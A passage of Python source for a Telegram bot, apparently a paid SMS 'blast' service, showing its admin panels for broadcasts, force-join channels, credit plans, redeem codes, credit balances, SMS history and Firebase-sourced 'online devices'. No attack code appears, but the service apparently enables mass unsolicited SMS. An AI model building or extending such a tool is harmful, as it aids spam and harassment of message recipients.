    bt = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(bt, reply_markup=bk, parse_mode="HTML")
    try: await cq.bot.send_message(ban_id, "✅ Ban hata diya gaya.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True); return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(f"📢 <b>Broadcast</b>\n\nMessage type karo:",
                               reply_markup=kb([(f"{sc('cancel')}", back)]), parse_mode="HTML")

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear(); return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"📤 Broadcasting to <b>{len(users)}</b>...", parse_mode="HTML")
    ok = 0; fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                await msg.bot.send_message(target, f"📢 <b>Broadcast</b>\n\n{msg.text}", parse_mode="HTML")
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception: fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    bk = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"✅ <b>Broadcast Done!</b>\n\n✅ Delivered: <b>{ok}</b>\n❌ Failed: <b>{fail}</b>",
                     reply_markup=bk, parse_mode="HTML")

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await cq.answer("📤 Exporting...")
    try:
        sp = os.path.abspath(__file__)
        if not os.path.exists(sp):
            sp = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(sp): sp = "blast_bot.py"
        await cq.message.reply_document(document=FSInputFile(sp),
            caption=f"📁 <b>Script Export</b> — <i>{_VERSION}</i>", parse_mode="HTML")
    except Exception as e:
        await cq.answer(f"❌ Export failed: {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True); return
    if cq.data == "admin:refresh":
        await cq.answer("🔄 Refreshing...", show_alert=False)
        try: await run_firebase_scan_once(cq.bot)
        except Exception as e: log.error(f"Refresh: {e}")
        d = load()
    else:
        await cq.answer()
    try: await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest: pass

@R.callback_query(F.data == "admin:stats")
async def admin_stats_cb(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin Only!", show_alert=True); return
    await cq.answer("⏳ Fetching...")
    current_fb_ids = {fb["id"] for fb in d.get("firebases", [])}
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    stale = [k for k in FB_DEVICE_COUNTS if k not in current_fb_ids]
    for k in stale: FB_DEVICE_COUNTS.pop(k, None)
    devices = get_cached_devices()
    if not devices: devices = await get_all_online_devices(d)
    stats_text = api_stats_text(d)
    dev_lines = [f"\n🟢 <b>Online Devices ({len(devices)})</b>\n"]
    if not devices: dev_lines.append("  😴 Koi online nahi")
    for dv in devices:
        dev_lines.append(f"  📱 <b>{dv['dev_name'][:20]}</b> — 🔥 {dv['fb_label'][:20]}")
    full = stats_text + "\n" + "\n".join(dev_lines)
    if len(full) > 4000: full = full[:3990] + "\n<i>...truncated</i>"
    await cq.message.edit_text(full, reply_markup=kb([(f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:menu")
async def owner_fj_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    status = "🟢 ON" if fj.get("enabled") else "🔴 OFF"
    text = f"🔗 <b>Force Join</b>\n\nStatus: {status}\nChannels: <b>{len(channels)}</b>\n\n"
    for ch in channels:
        req = "✅ Required" if ch.get("required", True) else "❌ Optional"
        text += f"• {ch.get('title', 'Channel')} (<code>{ch['id']}</code>)\n  {req} | {ch['link']}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴄʜᴀɴɴᴇʟ", "owner:fj:add", None, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴄʜᴀɴɴᴇʟ", "owner:fj:remove", None, "🗑")],
        [InlineKeyboardButton(text=f"🟢 {sc('enable')}" if not fj.get("enabled") else f"🔴 {sc('disable')}",
                              callback_data="owner:fj:toggle")],
        [btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:add")
async def owner_fj_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.fj_add_channel)
    await cq.message.edit_text(
        f"🔗 <b>Add Force Join Channel</b>\n\n{sc('step 1/2')}: Channel ID bhejo:\n<i>Example: -1001234567890</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_channel)
async def owner_fj_add_channel(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: ch_id = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid channel ID (numbers):", parse_mode="HTML"); return
    await state.update_data(fj_channel_id=ch_id)
    await state.set_state(S.fj_add_link)
    await msg.answer(f"🔗 <b>{sc('step 2/2')}</b>\n\nInvite link bhejo:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:fj:menu")]), parse_mode="HTML")

@R.message(S.fj_add_link)
async def owner_fj_add_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ Valid link (https://):", parse_mode="HTML"); return
    fsmd = await state.get_data()
    ch_id = str(fsmd.get("fj_channel_id"))
    try:
        chat = await msg.bot.get_chat(int(ch_id))
        title = chat.title or "Channel"
    except: title = "Channel"
    channels = d.setdefault("force_join", {}).setdefault("channels", [])
    channels = [c for c in channels if str(c["id"]) != ch_id]
    channels.append({"id": ch_id, "link": link, "title": title, "required": True})
    d["force_join"]["channels"] = channels; save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Channel Added!</b>\n\n📢 {title}\n🔗 {link}",
                     reply_markup=kb([(f"{sc('back')}", "owner:fj:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:fj:remove")
async def owner_fj_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    channels = d.get("force_join", {}).get("channels", [])
    if not channels:
        await cq.answer("❌ Koi channel nahi!", show_alert=True); return
    rows = []
    for ch in channels:
        rows.append([btn(f"{ch.get('title', 'Channel')[:25]}", f"owner:fj:del:{ch['id']}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:fj:menu", None, "🔙")])
    await cq.message.edit_text(f"🗑 <b>Remove Channel</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fj:del:"))
async def owner_fj_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    ch_id = cq.data.split("owner:fj:del:", 1)[1]
    channels = d.get("force_join", {}).get("channels", [])
    d["force_join"]["channels"] = [c for c in channels if str(c["id"]) != ch_id]
    save(d)
    await cq.answer("🗑 Channel removed!")
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:fj:toggle")
async def owner_fj_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    fj = d.setdefault("force_join", {})
    fj["enabled"] = not fj.get("enabled", False); save(d)
    status = "ENABLED" if fj["enabled"] else "DISABLED"
    await cq.answer(f"Force Join {status}!", show_alert=True)
    await owner_fj_menu(cq, state)

@R.callback_query(F.data == "owner:pricing:menu")
async def owner_pricing_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    text = f"💳 <b>Pricing Plans</b>\n\nTotal: <b>{len(plans)}</b>\n\n"
    for i, plan in enumerate(plans, 1):
        text += f"{i}. <b>{plan['name']}</b>\n   💰 {plan['price']} {plan.get('currency', 'INR')} = {plan['credits']} credits\n   🔗 {plan['payment_link']}\n\n"
    rows = [
        [btn("ᴀᴅᴅ ᴘʟᴀɴ", "owner:pricing:add", None, "➕")],
        [btn("ʀᴇᴍᴏᴠᴇ ᴘʟᴀɴ", "owner:pricing:remove", None, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:add")
async def owner_pricing_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.add_plan_name)
    await cq.message.edit_text(f"💳 <b>Add Plan</b>\n\n{sc('step 1/4')}: Plan ka naam:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_name)
async def owner_pricing_name(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    await state.update_data(plan_name=msg.text.strip())
    await state.set_state(S.add_plan_price)
    await msg.answer(f"💰 <b>{sc('step 2/4')}</b>\n\nPrice:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_price)
async def owner_pricing_price(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        price = float(msg.text.strip())
        await state.update_data(plan_price=price)
    except:
        await msg.answer("❌ Valid price:", parse_mode="HTML"); return
    await state.set_state(S.add_plan_credits)
    await msg.answer(f"🎁 <b>{sc('step 3/4')}</b>\n\nCredits:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_credits)
async def owner_pricing_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        await state.update_data(plan_credits=credits)
    except:
        await msg.answer("❌ Valid number:", parse_mode="HTML"); return
    await state.set_state(S.add_plan_link)
    await msg.answer(f"🔗 <b>{sc('step 4/4')}</b>\n\nPayment link:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.message(S.add_plan_link)
async def owner_pricing_link(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    link = msg.text.strip()
    if not link.startswith("http"):
        await msg.answer("❌ Valid URL:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    plan = {"id": str(int(time.time())), "name": fsmd.get("plan_name", "Plan"),
            "price": fsmd.get("plan_price", 0), "credits": fsmd.get("plan_credits", 0),
            "currency": "INR", "payment_link": link}
    d.setdefault("pricing", {}).setdefault("plans", []).append(plan); save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Plan Added!</b>\n\n📋 {plan['name']}\n💰 {plan['price']} INR = {plan['credits']} credits\n🔗 {plan['payment_link']}",
                     reply_markup=kb([(f"{sc('back')}", "owner:pricing:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:pricing:remove")
async def owner_pricing_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan nahi!", show_alert=True); return
    rows = []
    for plan in plans:
        rows.append([btn(f"{plan['name'][:25]}", f"owner:pricing:del:{plan['id']}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:pricing:menu", None, "🔙")])
    await cq.message.edit_text(f"🗑 <b>Remove Plan</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:pricing:del:"))
async def owner_pricing_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    plan_id = cq.data.split("owner:pricing:del:", 1)[1]
    plans = d.get("pricing", {}).get("plans", [])
    d["pricing"]["plans"] = [p for p in plans if p["id"] != plan_id]; save(d)
    await cq.answer("🗑 Plan removed!")
    await owner_pricing_menu(cq, state)

@R.callback_query(F.data == "owner:redeem:menu")
async def owner_redeem_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    codes = d.get("redeem_codes", {})
    text = f"🎁 <b>Redeem Codes</b>\n\nTotal: <b>{len(codes)}</b>\n\n"
    for code, data in list(codes.items())[:10]:
        status = "✅" if data.get("uses_left", 0) > 0 else "❌"
        text += f"<code>{code}</code> — 💰{data['credits']} — {status} ({data.get('uses_left', 0)} left)\n"
    rows = [
        [btn("ɢᴇɴᴇʀᴀᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:gen", None, "➕")],
        [btn("ᴅᴇʟᴇᴛᴇ ᴄᴏᴅᴇ", "owner:redeem:del", None, "🗑")],
        [btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:gen")
async def owner_redeem_gen_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.gen_redeem_credits)
    await cq.message.edit_text(f"🎁 <b>Generate Code</b>\n\n{sc('step 1/2')}: Credits:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_credits)
async def owner_redeem_credits(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        await state.update_data(gen_credits=credits)
    except:
        await msg.answer("❌ Valid number:", parse_mode="HTML"); return
    await state.set_state(S.gen_redeem_uses)
    await msg.answer(f"🎁 <b>{sc('step 2/2')}</b>\n\nMax uses:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.message(S.gen_redeem_uses)
async def owner_redeem_uses(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        uses = int(msg.text.strip())
        if uses < 1: raise ValueError
    except:
        await msg.answer("❌ Valid number (1+):", parse_mode="HTML"); return
    fsmd = await state.get_data()
    credits = fsmd.get("gen_credits", 10)
    while True:
        code = "GIFT" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))
        if code not in d.get("redeem_codes", {}): break
    d.setdefault("redeem_codes", {})[code] = {
        "credits": credits, "uses_left": uses, "created_by": msg.from_user.id,
        "created_at": int(time.time()), "used_by": []}
    save(d); await state.clear()
    await msg.answer(f"🎉 <b>Code Generated!</b>\n\n🎁 Code: <code>{code}</code>\n💰 Credits: <b>{credits}</b>\n🔢 Max Uses: <b>{uses}</b>",
                     reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:redeem:del")
async def owner_redeem_del_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    codes = d.get("redeem_codes", {})
    if not codes:
        await cq.answer("❌ Koi code nahi!", show_alert=True); return
    rows = []
    for code in list(codes.keys())[:20]:
        rows.append([btn(code, f"owner:redeem:deldo:{code}", None, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:redeem:menu", None, "🔙")])
    await cq.message.edit_text(f"🗑 <b>Delete Code</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:redeem:deldo:"))
async def owner_redeem_del_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    code = cq.data.split("owner:redeem:deldo:", 1)[1]
    if code in d.get("redeem_codes", {}):
        del d["redeem_codes"][code]; save(d)
    await cq.answer("🗑 Deleted!")
    await owner_redeem_menu(cq, state)

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.add_credits_uid)
    await cq.message.edit_text(f"💰 <b>Add Credits</b>\n\n{sc('step 1/2')}: User ID:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer("❌ Valid ID:", parse_mode="HTML"); return
    await state.set_state(S.add_credits_amount)
    await msg.answer(f"💰 <b>{sc('step 2/2')}</b>\n\nKitne credits?",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: amount = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid number:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")
    add_credits(uid, amount, d); save(d)
    await state.clear()
    try:
        await msg.bot.send_message(uid,
            f"💰 <b>Credits Added!</b>\n\n+{amount} credits!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
            parse_mode="HTML")
    except: pass
    await msg.answer(f"✅ <b>{amount} credits</b> added to <code>{uid}</code>!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
                     reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.deduct_credits_uid)
    await cq.message.edit_text(f"💸 <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ID:",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear(); return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer("❌ Valid ID:", parse_mode="HTML"); return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(f"💸 <b>{sc('step 2/2')}</b>\n\nKitne deduct?",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try: amount = int(msg.text.strip())
    except:
        await msg.answer("❌ Valid number:", parse_mode="HTML"); return
    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d); save(d)
    await state.clear()
    if success:
        try:
            await msg.bot.send_message(uid, f"⚠️ <b>Credits Deducted!</b>\n\n-{amount}\n💳 Balance: <b>{get_user_credits(uid, d)}</b>", parse_mode="HTML")
        except: pass
        await msg.answer(f"✅ <b>{amount} credits</b> deducted!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
                         reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
    else:
        await msg.answer(f"❌ Insufficient! Only <b>{get_user_credits(uid, d)}</b>",
                         reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    settings = d.get("settings", {})
    text = (f"⚙️ <b>Bot Settings</b>\n\n🎁 Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
            f"👑 Max Owners: <b>{settings.get('max_owners', 6)}</b>")
    rows = [[btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", None, "🎁")],
            [btn("ʙᴀᴄᴋ", "owner:home", None, "🔙")]]
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    await state.set_state(S.set_ref_credits)
    await cq.message.edit_text(f"🎁 <b>Set Referral Credits</b>\n\nKitne?",
                               reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]), parse_mode="HTML")

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear(); return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer("❌ Valid positive number:", parse_mode="HTML"); return
    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits; save(d)
    await state.clear()
    await msg.answer(f"✅ <b>Referral Credits Updated!</b>\n\nAb <b>{credits}</b> credits milenge.",
                     reply_markup=kb([(f"{sc('back')}", "owner:settings")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"📜 <b>Activity Log</b>\n\n<i>Koi activity nahi.</i>"
    else:
        lines = [f"📜 <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('refresh')}", "owner:activity"), (f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True); return
    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())
    text = f"📋 <b>Global SMS History</b>\n\nTotal: <b>{total_entries}</b>\n\n<i>Per-user history unke Stats mein.</i>"
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                   parse_mode="HTML", disable_web_page_preview=True); return
    if is_owner(uid, d):
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if not can_use(uid, d):
        await cq.message.edit_text("⛔ Access nahi hai!", parse_mode="HTML"); return
    await cq.message.edit_text(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await cq.message.edit_text(f"🎁 <b>Redeem Code</b>\n\nCode enter karein:",
                               reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    code = msg.text.strip().upper()
    await state.clear()
    codes = d.get("redeem_codes", {})
    if code not in codes:
        await msg.answer("❌ Invalid code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    cd = codes[code]
    if cd.get("uses_left", 0) <= 0:
        await msg.answer("❌ Code expired!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    if uid in cd.get("used_by", []):
        await msg.answer("❌ Aap already use kar chuke!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    credits = cd["credits"]
    add_credits(uid, credits, d)
    cd["uses_left"] = cd.get("uses_left", 1) - 1
    cd.setdefault("used_by", []).append(uid); save(d)
    await msg.answer(f"🎉 <b>Redeem Successful!</b>\n\n💰 +{credits} credits!\n💳 Balance: <b>{get_user_credits(uid, d)}</b>",
                     reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d); save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)
    me = await cq.bot.get_me()
    await cq.message.edit_text(
        f"👥 <b>Referral Program</b>\n\nShare aur har referral pe <b>{ref_credits}</b> credits!\n\n"
        f"🎁 Your Code: <code>{code}</code>\n\n🔗 https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})
    await cq.message.edit_text(
        f"📊 <b>Your Stats</b>\n\n💰 Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"📤 SMS Sent: <b>{udata.get('uses', 0)}</b>\n📅 Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"📈 Bot Total: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]
    if not history:
        text = f"📜 <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi.</i>"
    else:
        lines = [f"📜 <b>Your SMS History</b>\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            mp = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            icon = "✅" if status == "sent" else "🛑" if status == "stopped" else "⏳"
            lines.append(f"{i}. [{ts}] {icon} <code>{mask_number(num)}</code> — {mp}...")
        text = "\n".join(lines)
    await cq.message.edit_text(text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])
    if not plans:
        await cq.answer("❌ Koi plan available nahi!", show_alert=True); return
    text = f"💰 <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"📋 <b>{plan['name']}</b>\n   💰 {plan['price']} {plan.get('currency', 'INR')}\n   🎁 {plan['credits']} credits\n\n"
    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], None, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", None, "🔙")])
    await cq.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
